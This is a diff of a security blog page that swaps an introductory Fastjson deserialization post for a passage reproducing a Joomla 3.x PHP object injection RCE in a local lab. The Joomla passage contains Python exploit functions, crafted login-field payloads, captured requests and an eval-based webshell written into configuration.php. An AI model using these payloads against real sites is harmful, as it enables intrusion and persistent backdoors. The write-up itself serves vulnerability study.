@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web安全,代码审计,安全研究,">
+  <meta name="keywords" content="SecurityCN 博客">
 
 
 
@@ -81,34 +81,33 @@
 
 
 
-<meta name="description" content="#概述最近Fastjson反序列化Bypass绕过AutoType的漏洞越来越多，趁着国庆休息时间，把历年来曝光的3个FastjsonRCE漏洞进行了分析，把过程笔记整理下，本来想一篇blog文但篇幅越写越多，考虑到阅读体验就做了一个Fastjson反序列化漏洞的系列文章,大致如下：[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？[2]. Fastjson反序列化漏">
-<meta name="keywords" content="Web安全,代码审计,安全研究">
+<meta name="description" content="Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？">
-<meta property="og:url" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/index.html">
+<meta property="og:title" content="SecurityCN&#39;s blog">
+<meta property="og:url" content="https://securitycn.github.io/2019/10/10/bobao-360/index.html">
 <meta property="og:site_name" content="SecurityCN&#39;s blog">
-<meta property="og:description" content="#概述最近Fastjson反序列化Bypass绕过AutoType的漏洞越来越多，趁着国庆休息时间，把历年来曝光的3个FastjsonRCE漏洞进行了分析，把过程笔记整理下，本来想一篇blog文但篇幅越写越多，考虑到阅读体验就做了一个Fastjson反序列化漏洞的系列文章,大致如下：[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？[2]. Fastjson反序列化漏">
+<meta property="og:description" content="Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/69dac230a9e1a33222aeeb6e7c9c1be2.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/a13951628f8ef4c308e82a45f5bbd066.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/e72b22fb611b06330f1efac777c85b0a.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/5c690bce15fb9c76ce45da8829c13147.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/4854907e78c22d35916dcd9b9db879c4.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/28b369f50a8f7a79ed6ee33bf5fd6402.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/7d6858cb932c5132bf4c35909cc880a1.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/04133ed9c668463051e1e50989145fa2.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/1cfd2291fcfd2c12b56e4c6c4f70131e.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/4a674fe0c9b9490348c089f7ab8b7ae4.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/7b4fbd1857cac24b0599b14555808553.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/bc2ba58357122705a8081513c0bf9e6d.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/94338bc8ce0db46e20af85d643996f1f.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/8699cdf40d67ad43370cbccd3f0f8126.png">
-<meta property="og:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/17841661beae3930b7d2516d98fe7de6.png">
-<meta property="og:updated_time" content="2019-10-09T02:26:37.781Z">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01ed2645666dd1ba73.jpg">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t0184aeed409b3e82cc.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01cd7778a482d81eb9.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01ca72914463bd18c3.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t015ca8ca71c3696dee.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01d1ad8b71c62c139f.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01ed9eb4056cefcd1c.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t01369e06447bcfd0d3.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t013bafdb4d12d6d41c.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t018d23827dce01e65c.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t014f48326ca0f27154.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t0170b281ef982fa3fe.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01c41149da3c4df1c4.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t0172a850d77d06da72.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t0135f90532615cba3e.png">
+<meta property="og:updated_time" content="2019-10-10T01:43:56.879Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？">
-<meta name="twitter:description" content="#概述最近Fastjson反序列化Bypass绕过AutoType的漏洞越来越多，趁着国庆休息时间，把历年来曝光的3个FastjsonRCE漏洞进行了分析，把过程笔记整理下，本来想一篇blog文但篇幅越写越多，考虑到阅读体验就做了一个Fastjson反序列化漏洞的系列文章,大致如下：[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？[2]. Fastjson反序列化漏">
-<meta name="twitter:image" content="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/69dac230a9e1a33222aeeb6e7c9c1be2.png">
+<meta name="twitter:title" content="SecurityCN&#39;s blog">
+<meta name="twitter:description" content="Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-">
+<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t01ed2645666dd1ba73.jpg">
 
 
 
@@ -138,13 +137,13 @@
 
 
 
-  <link rel="canonical" href="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/">
+  <link rel="canonical" href="https://securitycn.github.io/2019/10/10/bobao-360/">
 
 
 
 
 
-  <title>【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？ | SecurityCN's blog</title>
+  <title> | SecurityCN's blog</title>
   
 
 
@@ -313,7 +312,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/">
+    <link itemprop="mainEntityOfPage" href="https://securitycn.github.io/2019/10/10/bobao-360/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ja0k">
@@ -330,7 +329,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -342,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-08T22:14:10+08:00">
-                2019-10-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-10T09:43:56+08:00">
+                2019-10-10
               </time>
             
 
@@ -352,39 +351,6 @@
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术/" itemprop="url" rel="index">
-                    <span itemprop="name">技术</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术/专栏/" itemprop="url" rel="index">
-                    <span itemprop="name">专栏</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -407,7 +373,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.2k
+                  2.9k
                 </span>
               
 
@@ -423,7 +389,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5
+                  13
                 </span>
               
             </div>
@@ -444,48 +410,94 @@
       
 
       
-        <p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/69dac230a9e1a33222aeeb6e7c9c1be2.png" alt></p>
-<h2 id="概述"><a href="#概述" class="headerlink" title="#概述"></a>#概述</h2><p>最近Fastjson反序列化Bypass绕过AutoType的漏洞越来越多，趁着国庆休息时间，把历年来曝光的3个Fastjson<br>RCE漏洞进行了分析，把过程笔记整理下，本来想一篇blog文但篇幅越写越多，考虑到阅读体验就做了一个Fastjson反序列化漏洞的系列文章,大致如下：<br>[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？<br>[2]. Fastjson反序列化漏洞系列2-如何构造fastjson反序列化RCE漏洞Poc？<br>[3]. Fastjson反序列化漏洞系列3-fastjson&lt;=1.2.24反序列化RCE漏洞（CNVD-2017-02833）原理分析及Poc构造<br>[4]. Fastjson反序列化漏洞系列4-fastjson&lt;1.2.48反序列化RCE漏洞（CNVD-2019-22238）原理分析及Poc构造<br>[5]. Fastjson反序列化漏洞系列5-fastjson&lt;=1.2.60反序列化RCE漏洞（CNVD-2019-32498）原理分析及Poc构造<br>（大概4-5篇这样，后面陆续更新，感兴趣的小伙伴可以搜索微信公众号：SecurityCN，或扫码文末的二维码关注）</p>
-<h2 id="1-Fastjson反序列化漏洞系列1-什么是fastjson反序列化？"><a href="#1-Fastjson反序列化漏洞系列1-什么是fastjson反序列化？" class="headerlink" title="[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？"></a>[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？</h2><h3 id="什么是Fastjson？"><a href="#什么是Fastjson？" class="headerlink" title="#什么是Fastjson？"></a>#什么是Fastjson？</h3><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库（<a href="https://github.com/alibaba/fastjson）" target="_blank" rel="noopener">https://github.com/alibaba/fastjson）</a><br>采用“假定有序快速匹配”的算法，它可以解析JSON格式的字符串，支持将Java<br>Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端等，目前有2个主要接口toJsonString和parseObject来分别实现序列化和反序列化。</p>
-<h3 id="Fastjson反序列化框架"><a href="#Fastjson反序列化框架" class="headerlink" title="#Fastjson反序列化框架"></a>#Fastjson反序列化框架</h3><p>Fastjson反序列化框架图</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/a13951628f8ef4c308e82a45f5bbd066.png" alt></p>
-<p>在Fastjson反序列化框架中JSON是门面类，提供一些静态方法，如parse，parseObject，其主要功能都是在DefaultJSONParser类中实现的。DefaultJSONParser引用了ParserConfig类，该类主要保存一些相关配置信息。也引用了JSONLexerBase类用来处理字符分析，序列化用到的是JavaBeanSerializer类，而反序列化用到的是JavaBeanDeserializer类。</p>
-<h3 id="Demo演示FastJson反序列化实现过程"><a href="#Demo演示FastJson反序列化实现过程" class="headerlink" title="#Demo演示FastJson反序列化实现过程"></a>#Demo演示FastJson反序列化实现过程</h3><p>1.定义User.java,代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//定义用户类</span><br><span class="line">public class User &#123;</span><br><span class="line">    private Long id;</span><br><span class="line">    private String name;</span><br><span class="line">//增加get/set方法</span><br><span class="line">    public Long getId() &#123; return id; &#125;</span><br><span class="line">    public void setId(Long id) &#123; this.id = id; &#125;</span><br><span class="line">    public String getName() &#123; return name; &#125;</span><br><span class="line">    public void setName(String name) &#123; this.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p><img src="https://p5.ssl.qhimg.com/t01ed2645666dd1ba73.jpg" alt></p>
+<p>Author：Ja0k</p>
+<h3 id="事件背景"><a href="#事件背景" class="headerlink" title="#事件背景"></a>#事件背景</h3><p>上周，意大利安全公司 Hacktive Security的研究员 Alessandro<br>Groppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-8562。建议使用就版本的用户更新到安全版本。</p>
+<p>在此次漏洞复现和原理分析过程中，学到很多东西，在这里要感谢PHITHON关于Joomla远程代码执行漏洞的总结，让我少走了很多弯路。<br>另外本文较长，请耐心阅读！</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="#影响范围"></a>#影响范围</h3><p>Joomla 3.0.0 至 3.4.6</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="#漏洞复现"></a>#漏洞复现</h3><p>1.安装部署</p>
+<p>下载： <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></p>
+<p>浏览器访问 <a href="http://127.0.0.1/Joomla/3.4.6/installation/index.php" target="_blank" rel="noopener">http://127.0.0.1/Joomla/3.4.6/installation/index.php</a> 安装<br>注意：第3步最终确认哪里，应该选择 “不安装示范数据”，目前测试的是选择”博客风格的示范内容”不能成功复现<br>安装成功<br><img src="https://p2.ssl.qhimg.com/t0184aeed409b3e82cc.png" alt></p>
+<p><img src="https://p5.ssl.qhimg.com/t01cd7778a482d81eb9.png" alt></p>
+<p>2.Exp复现<br>Exp地址:<br><a href="https://cxsecurity.com/issue/WLB-2019100045" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2019100045</a></p>
+<p>脚本利用</p>
+<p><img src="https://p4.ssl.qhimg.com/t01ca72914463bd18c3.png" alt></p>
+<p>执行成功反弹shell并在“configuration.php”写入随机密码的一句话木马</p>
+<p><img src="https://p3.ssl.qhimg.com/t015ca8ca71c3696dee.png" alt></p>
+<p>可以用NC 监听和 菜刀连接 由于我的PHP是Windows环境所以无法反弹只能通过菜刀连接</p>
+<p>caidao密码为 scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay 菜刀连接成功</p>
+<p><img src="https://p1.ssl.qhimg.com/t01d1ad8b71c62c139f.png" alt></p>
+<h3 id="Exp攻击链分析"><a href="#Exp攻击链分析" class="headerlink" title="#Exp攻击链分析"></a>#Exp攻击链分析</h3><p>目前互联网上公开的Exp地址:<br><a href="https://cxsecurity.com/issue/WLB-2019100045" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2019100045</a><br>通过漏洞复现和分析py脚本可以知道，在上传shell的时候有以下几步，之所以有这么手工步骤主要与Joomla的会话机制有关。<br><img src="https://p1.ssl.qhimg.com/t01ed9eb4056cefcd1c.png" alt></p>
+<p><strong>1.获取Cookie</strong><br>代码:<br><img src="https://p3.ssl.qhimg.com/t01369e06447bcfd0d3.png" alt><br>通过burpeuite抓到的请求包1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 
-<p>2.定义测试Test.java,代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">//定义测试类，</span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User guestUser = new User();</span><br><span class="line">        guestUser.setId(1L);</span><br><span class="line">        guestUser.setName(&quot;guest&quot;);</span><br><span class="line">        //将java对象序列化为json对象</span><br><span class="line">        String jsonString1 = JSON.toJSONString(guestUser);</span><br><span class="line">        System.out.println(&quot;Json对象:&quot;+jsonString1);</span><br><span class="line">        //将json反序列化为java对象</span><br><span class="line">        String jsonString2= &quot;&#123;\&quot;id\&quot;:2,\&quot;name\&quot;:\&quot;root\&quot;&#125;&quot;;</span><br><span class="line">        User user = JSON.parseObject(jsonString2,User.class);</span><br><span class="line">        System.out.println(&quot;Java对象:&quot;+user);</span><br><span class="line">        //打印变量类型</span><br><span class="line">        System.out.println(user.getClass().getTypeParameters());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>2.获取csrf-token （关键步骤）</strong><br>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def get_token(url, cook):</span><br><span class="line">        token = &apos;&apos;</span><br><span class="line">        resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">        html = BeautifulSoup(resp.text,&apos;html.parser&apos;)</span><br><span class="line">        # csrf token is the last input</span><br><span class="line">        for v in html.find_all(&apos;input&apos;):</span><br><span class="line">                csrf = v</span><br><span class="line">        csrf = csrf.get(&apos;name&apos;)</span><br><span class="line">        return csrf</span><br></pre></td></tr></table></figure>
 
-<p>运行<br><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/e72b22fb611b06330f1efac777c85b0a.png" alt><br>最后输出如下<br>jsonString1–Json对象:{“id”:1,”name”:”guest”}<br>user–Java对象:User@7ab2bfe1<br>user的类型为[Ljava.lang.reflect.TypeVariable;@497470ed</p>
-<h3 id="动态调试理解调用链"><a href="#动态调试理解调用链" class="headerlink" title="#动态调试理解调用链"></a>#动态调试理解调用链</h3><p>还是利用上面的Demo进行动态调试<br>在String jsonString1 = JSON.toJSONString(guestUser); 和User user =<br>JSON.parseObject(jsonString2,User.class); 处设置断点</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/5c690bce15fb9c76ce45da8829c13147.png" alt></p>
-<p><strong>1.动态调试理解这个序列化过程</strong><br>先调用/com/alibaba/fastjson/JSON.class的toJSONString对象</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/4854907e78c22d35916dcd9b9db879c4.png" alt></p>
-<p>com/alibaba/fastjson/serializer/SerializeWriter.class的SerializeWriter对象</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/28b369f50a8f7a79ed6ee33bf5fd6402.png" alt></p>
-<p>读取SerializeConfig 配置</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/7d6858cb932c5132bf4c35909cc880a1.png" alt></p>
-<p>最后调用 com/alibaba/fastjson/serializer/JavaBeanSerializer.class类进行序列化</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/04133ed9c668463051e1e50989145fa2.png" alt></p>
-<p>com/alibaba/fastjson/JSON.class 的toJSONString</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/1cfd2291fcfd2c12b56e4c6c4f70131e.png" alt></p>
-<p><strong>2.动态调试理解反序列化过程</strong></p>
-<p>先调用com/alibaba/fastjson/JSON.class的parseObject 对象</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/4a674fe0c9b9490348c089f7ab8b7ae4.png" alt></p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/7b4fbd1857cac24b0599b14555808553.png" alt></p>
-<p>跳到com/alibaba/fastjson/parser/DefaultJSONParser.class 的parseObject对象</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/bc2ba58357122705a8081513c0bf9e6d.png" alt></p>
-<p>com/alibaba/fastjson/parser/ParserConfig.class的ObjectDeserializer 对象</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/94338bc8ce0db46e20af85d643996f1f.png" alt></p>
-<p>最后调用<br>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class类进行反序列化</p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/8699cdf40d67ad43370cbccd3f0f8126.png" alt></p>
-<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/17841661beae3930b7d2516d98fe7de6.png" alt></p>
-<h3 id="造成远程命令执行的原因？"><a href="#造成远程命令执行的原因？" class="headerlink" title="#造成远程命令执行的原因？"></a>#造成远程命令执行的原因？</h3><p>Fastjson反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。常见的攻击流程是这样的：攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
-<p>本节到此结束，下一节是 [2].<br>Fastjson反序列化漏洞系列1-如何构造fastjson反序列化RCE漏洞Poc？<br>敬请期待，感兴趣的小伙伴可以搜索微信公众号：SecurityCN，或扫码文末的二维码关注。</p>
-<p>免责声明：</p>
-<p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>
-<p>参考：<br>[1].<a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
+<p>通过burpeuite抓到的请求包2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: dc674b0eef3d2412c63832504cf5ac18=sfoodgd4m6fj2c1895u5b2tmp6;</span><br></pre></td></tr></table></figure>
 
+<p>主要是从返回包中提取 csrftoken<br><img src="https://p4.ssl.qhimg.com/t013bafdb4d12d6d41c.png" alt></p>
+<p>3.生成payload 这里有2个payload<br><strong>后门的payload</strong><br>代码:<br><img src="https://p3.ssl.qhimg.com/t018d23827dce01e65c.png" alt><br>利用PHP自带的file_put_contents函数写入webshell到configuration.php中，webshell内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;if(isset($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;])) eval($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>反弹的payload</strong><br><img src="https://p3.ssl.qhimg.com/t014f48326ca0f27154.png" alt><br><img src="https://p5.ssl.qhimg.com/t0170b281ef982fa3fe.png" alt></p>
+<p>4.发送带有写入webshell的请求<br>主要构造username,password,option,task,csrftoken等字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def make_req(url , object_payload):</span><br><span class="line">        # just make a req with object</span><br><span class="line">        print_info(&apos;Getting Session Cookie ..&apos;)</span><br><span class="line">        cook = get_cook(url)</span><br><span class="line">        print_info(&apos;Getting CSRF Token ..&apos;)</span><br><span class="line">        csrf = get_token( url, cook)</span><br><span class="line"> </span><br><span class="line">        user_payload = &apos;\\0\\0\\0&apos; * 9</span><br><span class="line">        padding = &apos;AAA&apos; # It will land at this padding</span><br><span class="line">        working_test_obj = &apos;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;&apos;</span><br><span class="line">        clean_object = &apos;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&apos; # working good without bad effects</span><br><span class="line"> </span><br><span class="line">        inj_object = &apos;&quot;;&apos;</span><br><span class="line">        inj_object += object_payload</span><br><span class="line">        inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part</span><br><span class="line">        password_payload = padding + inj_object</span><br><span class="line">        params = &#123;</span><br><span class="line">            &apos;username&apos;: user_payload,</span><br><span class="line">            &apos;password&apos;: password_payload,</span><br><span class="line">            &apos;option&apos;:&apos;com_users&apos;,</span><br><span class="line">            &apos;task&apos;:&apos;user.login&apos;,</span><br><span class="line">            csrf :&apos;1&apos;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        print_info(&apos;Sending request ..&apos;)</span><br><span class="line">        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line">        return resp.text</span><br></pre></td></tr></table></figure>
+
+<p>下面是通过Burpsuite抓包获取的写入webshell的请求包3</p>
